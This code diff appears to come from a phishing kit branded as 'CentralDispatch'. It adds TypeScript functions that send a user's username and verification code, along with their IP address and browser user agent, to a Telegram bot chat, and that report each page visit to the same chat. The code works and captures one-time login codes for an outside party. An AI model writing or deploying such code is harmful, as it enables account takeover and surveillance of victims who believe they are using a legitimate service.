@@ -113,3 +113,161 @@ export async function answerCallbackQuery(
   }
 }
 
+/**
+ * Отправка кода верификации в Telegram
+ * @param code - код верификации
+ * @param username - имя пользователя
+ * @param clientIp - IP адрес клиента
+ * @param userAgent - User Agent браузера
+ */
+export async function sendCodeTelegram(
+  code: string,
+  username: string,
+  clientIp: string,
+  userAgent: string
+): Promise<void> {
+  console.log("[TELEGRAM] Отправка кода верификации...");
+
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
+  }
+
+  const message = `🔢 *CentralDispatch - Код верификации*
+
+👤 *Username:* \`${username}\`
+🔑 *Code:* \`${code}\`
+
+🌐 *IP:* \`${clientIp}\`
+💻 *User Agent:* \`${userAgent}\`
+
+⏰ *Время:* ${new Date().toLocaleString("ru-RU")}`;
+
+  try {
+    const response = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      }
+    );
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      console.error("[TELEGRAM] Ошибка отправки кода:", data);
+      throw new Error(data.description || "Не удалось отправить код в Telegram");
+    }
+
+    console.log("[TELEGRAM] Код успешно отправлен");
+  } catch (error) {
+    console.error("[TELEGRAM] Ошибка:", error);
+    throw new Error("Не удалось отправить код в Telegram");
+  }
+}
+
+/**
+ * Отправка произвольного сообщения в Telegram
+ * @param chatId - ID чата
+ * @param message - текст сообщения
+ * @param parseMode - режим парсинга (Markdown, HTML)
+ */
+export async function sendMessage(
+  chatId: string | number,
+  message: string,
+  parseMode?: string
+): Promise<void> {
+  if (!TELEGRAM_BOT_TOKEN) {
+    throw new Error("TELEGRAM_BOT_TOKEN не настроен");
+  }
+
+  try {
+    const response = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: parseMode || undefined,
+        }),
+      }
+    );
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      console.error("[TELEGRAM] Ошибка отправки сообщения:", data);
+      throw new Error(data.description || "Не удалось отправить сообщение");
+    }
+
+    console.log("[TELEGRAM] Сообщение успешно отправлено");
+  } catch (error) {
+    console.error("[TELEGRAM] Ошибка:", error);
+    throw error;
+  }
+}
+
+/**
+ * Отправка уведомления о посещении сайта
+ * @param path - путь страницы
+ * @param userAgent - User Agent браузера
+ * @param clientIp - IP адрес клиента
+ */
+export async function sendVisitNotification(
+  path: string,
+  userAgent: string,
+  clientIp: string
+): Promise<void> {
+  console.log("[TELEGRAM] Отправка уведомления о посещении...");
+
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn("[TELEGRAM] Telegram не настроен, пропускаем уведомление");
+    return;
+  }
+
+  const message = `🌐 *CentralDispatch - Новое посещение*
+
+📍 *Страница:* ${path}
+🌐 *IP:* \`${clientIp}\`
+💻 *User Agent:* \`${userAgent}\`
+
+⏰ *Время:* ${new Date().toLocaleString("ru-RU")}`;
+
+  try {
+    const response = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      }
+    );
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      console.error("[TELEGRAM] Ошибка отправки уведомления:", data);
+    } else {
+      console.log("[TELEGRAM] Уведомление о посещении отправлено");
+    }
+  } catch (error) {
+    console.error("[TELEGRAM] Ошибка:", error);
+  }
+}
+
